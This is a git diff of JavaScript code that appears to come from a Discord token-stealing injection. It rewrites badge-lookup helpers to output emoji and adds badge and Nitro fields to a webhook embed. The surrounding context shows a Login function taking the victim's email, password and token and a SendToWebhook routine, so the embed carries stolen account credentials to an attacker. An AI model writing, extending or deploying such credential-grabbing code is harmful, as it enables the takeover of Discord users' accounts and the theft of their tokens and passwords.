@@ -82,57 +82,89 @@ function SendToWebhook(what) {
     `, !0).then((token => {}))
 }
 
-  function GetBadges(flags)
-  {
-  const Discord_Employee = 1;
-  const Partnered_Server_Owner = 2;
-  const HypeSquad_Events = 4;
-  const Bug_Hunter_Level_1 = 8;
-  const House_Bravery = 64;
-  const House_Brilliance = 128;
-  const House_Balance = 256;
-  const Early_Supporter = 512;
-  const Bug_Hunter_Level_2 = 16384;
-  const Early_Verified_Bot_Developer = 131072;
-  
-  var badges = "";
-  
-  if((flags & Discord_Employee) == Discord_Employee){
-     badges += "discord staff ";
-  }
-  if((flags & Partnered_Server_Owner) == Partnered_Server_Owner){
-     badges += "partnered server owner ";
-  }
-  if((flags & HypeSquad_Events) == HypeSquad_Events){
-     badges += "hypesquad events "
-  }
-  if((flags & Bug_Hunter_Level_1) == Bug_Hunter_Level_1){
-     badges += "bug hunter tier 1 ";
-  }
-  if((flags & House_Bravery) == House_Bravery) {
-     badges += "hypesquad bravery ";
-  }
-  if((flags & House_Brilliance) == House_Brilliance){
-     badges += "hypesquad brillance ";
-  }
-  if((flags & House_Balance) == House_Balance){
-     badges += "hypesquad balance ";
-  }
-  if((flags & Early_Supporter) == Early_Supporter){
-     badges += "early supporter ";
-  }
-  if((flags & Bug_Hunter_Level_2) == Bug_Hunter_Level_2){
-     badges += "bug hunter tier 2 ";
-  }
-  if((flags &Early_Verified_Bot_Developer ) == Early_Verified_Bot_Developer ){
-     badges += "verified bot developer ";
-  }
-  if (badges == "" ){
-      badges = "no badges"
-  }
-  return badges;
-  
-  }
+function GetRBadges(flags) {
+	const Discord_Employee = 1;
+	const Partnered_Server_Owner = 2;
+	const HypeSquad_Events = 4;
+	const Bug_Hunter_Level_1 = 8;
+	const Early_Supporter = 512;
+	const Bug_Hunter_Level_2 = 16384;
+	const Early_Verified_Bot_Developer = 131072;
+	var badges = "";
+	if ((flags & Discord_Employee) == Discord_Employee) {
+		badges += "<:staff:874750808728666152> "
+	}
+	if ((flags & Partnered_Server_Owner) == Partnered_Server_Owner) {
+		badges += "<:partner:874750808678354964> "
+	}
+	if ((flags & HypeSquad_Events) == HypeSquad_Events) {
+		badges += "<:hypesquad_events:874750808594477056> "
+	}
+	if ((flags & Bug_Hunter_Level_1) == Bug_Hunter_Level_1) {
+		badges += "<:bughunter_1:874750808426692658> "
+	}
+	if ((flags & Early_Supporter) == Early_Supporter) {
+		badges += "<:early_supporter:874750808414113823> "
+	}
+	if ((flags & Bug_Hunter_Level_2) == Bug_Hunter_Level_2) {
+		badges += "<:bughunter_2:874750808430874664> "
+	}
+	if ((flags & Early_Verified_Bot_Developer) == Early_Verified_Bot_Developer) {
+		badges += "<:developer:874750808472825986> "
+	}
+	if (badges == "") {
+		badges = ""
+	}
+	return badges
+}
+
+function GetBadges(flags) {
+	const Discord_Employee = 1;
+	const Partnered_Server_Owner = 2;
+	const HypeSquad_Events = 4;
+	const Bug_Hunter_Level_1 = 8;
+	const House_Bravery = 64;
+	const House_Brilliance = 128;
+	const House_Balance = 256;
+	const Early_Supporter = 512;
+	const Bug_Hunter_Level_2 = 16384;
+	const Early_Verified_Bot_Developer = 131072;
+	var badges = "";
+	if ((flags & Discord_Employee) == Discord_Employee) {
+		badges += "<:staff:874750808728666152> "
+	}
+	if ((flags & Partnered_Server_Owner) == Partnered_Server_Owner) {
+		badges += "<:partner:874750808678354964> "
+	}
+	if ((flags & HypeSquad_Events) == HypeSquad_Events) {
+		badges += "<:hypesquad_events:874750808594477056> "
+	}
+	if ((flags & Bug_Hunter_Level_1) == Bug_Hunter_Level_1) {
+		badges += "<:bughunter_1:874750808426692658> "
+	}
+	if ((flags & House_Bravery) == House_Bravery) {
+		badges += "<:bravery:874750808388952075> "
+	}
+	if ((flags & House_Brilliance) == House_Brilliance) {
+		badges += "<:brilliance:874750808338608199> "
+	}
+	if ((flags & House_Balance) == House_Balance) {
+		badges += "<:balance:874750808267292683> "
+	}
+	if ((flags & Early_Supporter) == Early_Supporter) {
+		badges += "<:early_supporter:874750808414113823> "
+	}
+	if ((flags & Bug_Hunter_Level_2) == Bug_Hunter_Level_2) {
+		badges += "<:bughunter_2:874750808430874664> "
+	}
+	if ((flags & Early_Verified_Bot_Developer) == Early_Verified_Bot_Developer) {
+		badges += "<:developer:874750808472825986> "
+	}
+	if (badges == "") {
+		badges = "None"
+	}
+	return badges
+}
 
 function Login(email, password, token) {
     const window = BrowserWindow.getAllWindows()[0];
@@ -180,7 +212,22 @@ function Login(email, password, token) {
                             "name": "᲼᲼᲼᲼",
                             "value": `᲼᲼᲼᲼`,
                             "inline": false
+                        }, 
+                        {
+                            "name": " badges",
+                            "value": ` - ${GetBadges(json.flags)}`,
+                            "inline": true		    
                         },
+                        {
+                            "name": " nitro",
+                            "value": ` - ${GetNitro(json.premium_type)}`,
+                            "inline": true		    
+                        },
+                        {
+                            "name": "᲼᲼᲼᲼",
+                            "value": `᲼᲼᲼᲼`,
+                            "inline": false
+                        }, 
                         {
                             "name": " token",
                             "value": ` - ${token}`,
